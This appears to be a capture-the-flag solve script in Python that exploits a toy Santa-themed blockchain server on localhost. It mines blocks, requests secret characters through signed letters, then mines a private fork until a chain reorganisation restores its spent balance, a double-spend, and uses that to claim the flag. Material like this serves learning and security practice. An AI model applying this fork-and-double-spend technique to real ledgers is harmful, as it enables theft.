#!/usr/bin/env python3
import hashlib
import json
import time
import uuid
import requests
import sys
from pathlib import Path
from cryptography.hazmat.primitives import serialization

# --- Configuration ---
NORTH_POOLE = "http://localhost"
MY_DIR = Path("/challenge/keys/hacker")
MY_KEY = serialization.load_ssh_private_key(
    (MY_DIR / "key").read_bytes(), password=None
)
MY_NAME = "hacker"

# --- Helpers ---

def hash_block(block):
    return hashlib.sha256(
        json.dumps(block, sort_keys=True, separators=(",", ":")).encode()
    ).hexdigest()

def get_head():
    return requests.get(f"{NORTH_POOLE}/block").json()

def get_block(hash_):
    return requests.get(f"{NORTH_POOLE}/block", params={"hash": hash_}).json()["block"]

def print_nice_balance(tag=""):
    head = requests.get(f"{NORTH_POOLE}/block").json()
    head_hash = head["hash"]

    balances = requests.get(
        f"{NORTH_POOLE}/balances",
        params={"hash": head_hash}
    ).json()["balances"]

    print(f"[nice] {tag} balances:", balances)
    print(f"[nice] {tag} hacker balance:", balances.get("hacker", 0))

def mine_block(nice_person=None, include_txs=True, parent_hash=None):
    if parent_hash is None:
        head = get_head()
        parent_hash = head["hash"]
        parent_block = head["block"]
    else:
        parent_block = get_block(parent_hash)

    txs = []
    if include_txs:
        txs = requests.get(f"{NORTH_POOLE}/txpool").json().get("txs", [])

    block = {
        "index": parent_block["index"] + 1,
        "prev_hash": parent_hash,
        "nonce": 0,
        "txs": txs,
        "nice": nice_person,
    }

    nonce = 0
    while True:
        block["nonce"] = nonce
        if hash_block(block).startswith("0000"):
            break
        nonce += 1

    r = requests.post(f"{NORTH_POOLE}/block", json=block)
    if r.status_code == 200:
        blk_hash = hash_block(block)
        print(
            f"[+] Mined block {block['index']} | "
            f"TXs={len(txs)} | Nice={nice_person}"
        )
        return blk_hash
    return None

def send_letter(text):
    letter = {
        "src": MY_NAME,
        "dst": "santa",
        "type": "letter",
        "letter": text,
        "nonce": str(uuid.uuid4()),
    }
    msg = json.dumps(letter, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest()
    letter["sig"] = MY_KEY.sign(digest).hex()

    r = requests.post(f"{NORTH_POOLE}/tx", json=letter)
    if r.status_code != 200:
        print("[-] Letter failed:", r.text)
    return letter["nonce"]

# --- Main ---

if __name__ == "__main__":

    print("\n--- ⛏️ STEP 1: Mine nice balance buffer ---")
    for _ in range(10):
        mine_block(nice_person=MY_NAME)

    clean_head = get_head()["hash"]
    clean_index = get_head()["block"]["index"]

    print("\n--- 📧 STEP 2: Request 32 secret characters ---")
    nonce_map = {}
    for i in range(32):
        n = send_letter(
            f"Dear Santa,\n\nFor christmas this year I would like secret index #{i}"
        )
        nonce_map[n] = i

    print("\n--- ⛏️ STEP 3: Confirm letters ---")
    for _ in range(6):
        mine_block()
        time.sleep(1)

    print("\n--- 🎁 STEP 4: Collect secrets ---")
    recovered = ["?"] * 32
    got = 0

    while got < 32:
        txs = requests.get(f"{NORTH_POOLE}/txpool").json().get("txs", [])

        cur = get_head()["hash"]
        for _ in range(8):
            blk = get_block(cur)
            txs.extend(blk["txs"])
            cur = blk["prev_hash"]

        for tx in txs:
            if tx.get("type") == "gift" and tx.get("dst") == MY_NAME:
                req = tx["nonce"].replace("-gift", "")
                if req in nonce_map:
                    idx = nonce_map[req]
                    if recovered[idx] == "?":
                        recovered[idx] = tx["gift"]
                        got += 1
                        print(
                            f"\rProgress: {''.join(recovered)} ({got}/32)",
                            end=""
                        )
        time.sleep(2)

    secret = "".join(recovered)
    print(f"\n[+] Secret recovered: {secret}")

    print("\n--- 🌲 STEP 5: Mine fork until it becomes best ---")
    fork_hash = clean_head

    while True:
        new_hash = mine_block(include_txs=False, parent_hash=fork_hash)
        if new_hash is None:
            continue

        fork_hash = new_hash

        head = get_head()
        print(
            f"[i] Fork index={get_block(fork_hash)['index']}, "
            f"Head index={head['block']['index']}"
        )

        if head["hash"] == fork_hash:
            print("[✓] Fork is now the active best chain")
            break

    print_nice_balance("after fork")

    print("\n--- 🎅 STEP 6: Request FLAG ---")
    send_letter(
        f"Dear Santa,\n\nFor christmas this year I would like {secret}"
    )

    print("\n--- 🎁 STEP 7: Waiting for FLAG gift ---")
    while True:
        txs = requests.get(f"{NORTH_POOLE}/txpool").json().get("txs", [])

        cur = get_head()["hash"]
        for _ in range(10):
            blk = get_block(cur)
            txs.extend(blk["txs"])
            cur = blk["prev_hash"]

        for tx in txs:
            if tx.get("type") == "gift" and tx.get("dst") == MY_NAME:
                print("🏁 FLAG:", tx["gift"])

        time.sleep(2)
